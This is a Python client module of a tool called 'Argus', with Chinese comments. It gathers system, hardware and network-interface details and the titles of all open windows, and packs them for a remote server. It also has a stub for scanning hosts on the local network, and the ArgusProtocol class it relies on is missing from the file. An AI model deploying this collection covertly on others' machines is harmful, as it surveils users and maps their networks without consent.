import json
import os
import platform
import socket
import time
import uuid

import netifaces
import psutil
import pygetwindow as gw
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding

server_ip = ""
server_info_port = 1819
client_id = str(uuid.uuid4())
version = "1.0.0"

class GetInfo:
    # def __init__(self):
    #     f_info_protocol = ArgusProtocol

    @staticmethod
    def get_comp_info():
        # 信息获取函数，得到硬件基础信息，网络信息等 
        interfaces = netifaces.interfaces()
        date_info = time.strftime("%Y-%m-%d", time.localtime())
        cpu_info = {
            'cpu_logical_cores': psutil.cpu_count(logical=True),
            'cpu_physical_cores': psutil.cpu_count(logical=False),
            'cpu_freq': psutil.cpu_freq(),
            'cpu_percent': psutil.cpu_percent()
        }
        basic_info = {
            'os_info': platform.platform(),
            # 获取操作系统的详细信息
            'system_info': platform.uname(),
            # 获取 CPU 信息
            'cpu_info': cpu_info,
            # 获取内存信息
            'memory_info': psutil.virtual_memory(),
            # 获取硬盘信息
            'disk_info': psutil.disk_partitions()
        }
        network_info = []
        for iface in interfaces:
            try:
                addresses = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addresses:
                    ipv4_addresses = addresses[netifaces.AF_INET]
                    mac_address = addresses[netifaces.AF_LINK]
                    network_info_frag = {
                        'Interface': iface,
                        'IPV4_address': ipv4_addresses[0]['addr'],
                        'IPV4_netmask': ipv4_addresses[0]['netmask'],
                        'MAC_address': mac_address[0]['addr']
                    }
                    network_info.append(network_info_frag)
            except ValueError as e:
                print(f"An error occurred during obtaining the network info. {e}")
                pass
        comp_info = {
            'title': "Comprehensive Info",
            'content': {
                'overview': platform.uname()._asdict(),
                'basic_info': basic_info,
                'network_info': network_info,
                'date_stramp': date_info,
                'uuid': client_id
            }
        }
        info_data_package = ArgusProtocol.pack("INFO", str(comp_info).encode())
        return info_data_package

    @staticmethod
    def get_windows_info():
        # 获取目前所有打开的窗口，包括标题，大小等。作用比较鸡肋。还有是否可见这个属性似乎有问题。
        window_collection = []
        all_windows = gw.getAllWindows()

        for window in all_windows:
            window_info = {
                "Window title": window.title,
                "Visibility": window.visible,
                "Height": window.height,
                "Width": window.width,
                "Is Minimized": window.isMinimized,
                "Is Maximized": window.isMaximized,
                "Is Active": window.isActive
            }
            window_collection.append(window_info)
        info_data_package = ArgusProtocol.pack("INFO", str(window_collection).encode())
        return info_data_package

    @staticmethod
    def get_network_env_info():
        # 这个函数是用来扫描局域网主机的，可以在之后的版本中用到，但是估计得换类
        info_data_package = ArgusProtocol.pack("INFO", b"Not Finished")
        return info_data_package


if __name__ == "__main__":
    print(ArgusProtocol.key_agreement_rsa())
    # print(GetInfo.get_comp_info())
    # print(GetInfo.get_windows_info())
    # print(GetInfo.get_network_env_info())
